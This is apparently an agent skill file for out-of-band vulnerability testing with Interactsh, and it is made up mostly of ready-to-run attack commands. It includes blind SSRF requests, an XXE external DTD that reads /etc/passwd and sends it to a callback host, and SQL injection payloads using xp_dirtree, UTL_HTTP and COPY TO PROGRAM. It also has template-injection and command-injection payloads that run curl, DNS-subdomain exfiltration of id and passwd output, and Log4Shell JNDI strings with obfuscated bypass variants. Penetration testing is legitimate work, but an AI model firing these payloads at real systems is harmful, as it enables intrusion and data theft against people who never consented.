---
name: vuln-interactsh-oob
description: "Out-of-band vulnerability detection with Interactsh. Blind SSRF via URL/header injection, blind XXE with external entity and parameter entity OOB data exfiltration, blind SQL injection via MySQL/MSSQL/PostgreSQL/Oracle OOB channels, blind SSTI via Jinja2/Twig/FreeMarker with curl callback, blind command injection DNS/HTTP ping, Log4Shell JNDI payload detection across HTTP headers, bulk OOB testing with Nuclei -iserver, DNS subdomain base64 data exfiltration parsing. Triggers: 'interactsh', 'oob testing', 'blind ssrf', 'blind xxe', 'blind sqli oob', 'blind rce', 'oast', 'out-of-band', 'log4shell detection', 'dns callback', 'oob callback', 'blind vulnerability'."
---

# Vuln — Out-of-Band Testing with Interactsh

Blind SSRF, XXE, SQLi, RCE, Log4Shell detection via OOB callbacks.

## Install

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
# Or use hosted: app.interactsh.com
```

---

## Phase 1: Setup OOB Listener

```bash
# Start listener — gets unique OOB domain:
interactsh-client

# Example output:
# [INF] Listing on c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro
OOB="c3pv6n18vl2fsst4oqkgdm15kbmkf.oast.pro"
echo "$OOB" > /workspace/output/interactsh_host.txt

# JSON mode (structured output):
interactsh-client -json | tee /workspace/output/interactsh_log.json &

# Self-hosted (no external deps):
interactsh-server -domain oob.yourdomain.com -ip YOUR_IP
interactsh-client -server https://oob.yourdomain.com
```

---

## Phase 2: Blind SSRF

```bash
OOB=$(cat /workspace/output/interactsh_host.txt)
TARGET="https://TARGET"

# URL parameter:
curl -sk "$TARGET/fetch?url=http://ssrf.$OOB"
curl -sk "$TARGET/proxy?target=http://ssrf-proxy.$OOB"
curl -sk "$TARGET/api/webhook" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://webhook.$OOB\"}"

# Header-based:
for header in "X-Forwarded-For" "Referer" "X-Original-URL" "X-Real-IP" "CF-Connecting-IP"; do
    curl -sk "$TARGET/" -H "$header: http://$header-test.$OOB" -o /dev/null
done

# PDF/image render:
curl -sk "$TARGET/render" -d "url=http://pdf-render.$OOB/image.png"

# XML upload (XXE → SSRF):
curl -sk -X POST "$TARGET/upload" -H "Content-Type: text/xml" \
    --data '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "http://xxe.'$OOB'">]><r>&e;</r>'
```

---

## Phase 3: Blind XXE OOB Exfiltration

```bash
OOB=$(cat /workspace/output/interactsh_host.txt)

# Direct entity (HTTP outbound allowed):
curl -sk -X POST "$TARGET/api/parse" -H "Content-Type: application/xml" \
    --data '<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "http://xxe.'$OOB'/?d=test">
]>
<r>&xxe;</r>'

# Parameter entity with file read:
# Host evil.dtd on accessible server:
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://data.OOB_HOST/?d=%file;'>">
%oob;
%exfil;
EOF

# Replace OOB_HOST:
sed "s/OOB_HOST/$OOB/g" /tmp/evil.dtd | curl -sk -F "dtd=@-" "http://ATTACKER_HOST/evil.dtd"

# Reference external DTD:
curl -sk -X POST "$TARGET/api/parse" -H "Content-Type: application/xml" \
    --data '<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://dtd.'$OOB'/evil.dtd">
  %remote;
]>
<r>test</r>'
```

---

## Phase 4: Blind SQL Injection OOB

```bash
OOB=$(cat /workspace/output/interactsh_host.txt)

# MySQL (requires FILE priv):
curl -sk "$TARGET/api/item?id=1+AND+LOAD_FILE(0x2f2f$OOB2f$OOB)"
# Note: hex encode // as 0x2f2f

# MSSQL via xp_dirtree (DNS):
curl -sk "$TARGET/api/item?id=1;EXEC+master..xp_dirtree+'//$OOB/test'--"

# MSSQL via xp_fileexist:
curl -sk "$TARGET/api/item?id=1;EXEC+master..xp_fileexist+'//$OOB/test'--"

# Oracle via UTL_HTTP:
curl -sk "$TARGET/api/item?id=1+UNION+SELECT+UTL_HTTP.REQUEST('http://$OOB')+FROM+dual--"

# PostgreSQL via COPY:
curl -sk "$TARGET/api/item?id=1;COPY+(SELECT+1)+TO+PROGRAM+'curl+http://$OOB'--"

# SQLite via load_extension:
curl -sk "$TARGET/api/item?id=1);SELECT+load_extension('/tmp/x.$OOB')--"
```

---

## Phase 5: Blind SSTI OOB

```bash
OOB=$(cat /workspace/output/interactsh_host.txt)

# Jinja2 (Python):
curl -sk "$TARGET/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('curl+http://j2.$OOB').read()}}"

# Twig (PHP):
curl -sk "$TARGET/page" -d "tpl={{['curl','http://twig.$OOB']|join(' ')|system}}"

# FreeMarker (Java):
curl -sk "$TARGET/page" \
    -d 'tpl=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://fm.'$OOB'")}'

# Velocity (Java):
curl -sk "$TARGET/page" \
    -d 'tpl=#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.ProcessBuilder"))...'
```

---

## Phase 6: Blind Command Injection OOB

```bash
OOB=$(cat /workspace/output/interactsh_host.txt)

# HTTP callback:
curl -sk "$TARGET/ping?host=127.0.0.1;curl+http://rce.$OOB"
curl -sk "$TARGET/ping?host=127.0.0.1\`curl+http://rce.$OOB\`"
curl -sk "$TARGET/convert?input=test|curl+http://pipe.$OOB"

# DNS only (when HTTP blocked):
curl -sk "$TARGET/ping?host=\$(nslookup dns.$OOB)"
curl -sk "$TARGET/ping?host=127.0.0.1;ping+-c+1+ping.$OOB"
curl -sk "$TARGET/ping?host=127.0.0.1%0anslookup%20dns.$OOB"

# Data exfil via DNS subdomain:
# $(curl http://$(cat /etc/passwd | base64 | head -c 20 | tr -d '=\n').data.$OOB/)
curl -sk "$TARGET/cmd" -d "cmd=\$(curl+http://\$(id|base64|head+-c+20).data.$OOB/)"
```

---

## Phase 7: Log4Shell OOB Detection

```bash
OOB=$(cat /workspace/output/interactsh_host.txt)
PAYLOAD="\${jndi:ldap://log4j.$OOB/a}"

# All common headers:
curl -sk "https://TARGET/" \
    -H "User-Agent: $PAYLOAD" \
    -H "X-Api-Version: $PAYLOAD" \
    -H "Referer: $PAYLOAD" \
    -H "X-Forwarded-For: $PAYLOAD" \
    -H "Authorization: Bearer $PAYLOAD" \
    -H "X-Real-IP: $PAYLOAD"

# POST body:
curl -sk -X POST "https://TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$PAYLOAD\",\"password\":\"x\"}"

# Obfuscated bypass variants:
curl -sk "https://TARGET/" -H "User-Agent: \${j\${lower:n}di:ldap://obf1.$OOB/a}"
curl -sk "https://TARGET/" -H "User-Agent: \${jndi:dns://dns.$OOB}"
curl -sk "https://TARGET/" -H "User-Agent: \${jndi:\${lower:l}dap://lcase.$OOB/a}"
```

---

## Phase 8: Nuclei Bulk OOB

```bash
OOB=$(cat /workspace/output/interactsh_host.txt)

# Auto-inject OOB into all supporting templates:
nuclei -u "https://TARGET" -t http/vulnerabilities/ \
    -iserver "$OOB" -silent \
    -o /workspace/output/TARGET_oob_vulns.txt

# Blind templates:
nuclei -u "https://TARGET" \
    -t http/blind/ \
    -iserver "$OOB" -silent

# Log4Shell specific:
nuclei -u "https://TARGET" \
    -t http/cves/2021/CVE-2021-44228.yaml \
    -iserver "$OOB" -silent

# Watch for callbacks:
interactsh-client -json 2>/dev/null | python3 -c "
import json, sys
for line in sys.stdin:
    try:
        d = json.loads(line)
        print(f'[{d[\"protocol\"].upper()}] from {d[\"remote-address\"]} → {d[\"full-id\"]}')
        if 'raw-request' in d:
            print(d['raw-request'][:300])
        print('---')
    except: pass
"
```

---

## Phase 9: DNS Exfil Decode

```bash
# Interactsh captures subdomain prefix as data
# Payload: $(cat /flag.txt | base64 -w 0 | head -c 50).data.$OOB
# Captured: aGVsbG8gd29ybGQ.data.oast.pro

python3 << 'EOF'
import base64, sys

# Read subdomain from interactsh log:
subdomain = "aGVsbG8gd29ybGQ"  # from captured DNS query

# Fix base64 padding:
padded = subdomain + '=' * (-len(subdomain) % 4)
decoded = base64.b64decode(padded).decode('utf-8', errors='replace')
print(f"Decoded: {decoded}")

# For longer data — chain multiple requests:
# Split flag into 40-char chunks, each becomes a DNS query
# Reassemble from interactsh logs in order
EOF
```

---

## Output

Save to `/workspace/output/`:
- `interactsh_host.txt` — OOB domain for this session
- `interactsh_log.json` — all captured callbacks
- `TARGET_oob_vulns.txt` — Nuclei OOB findings

## Next Phase

→ `vuln-exploit-validation` for safe POC validation
→ `pentest-exploit` for exploitation after confirmation
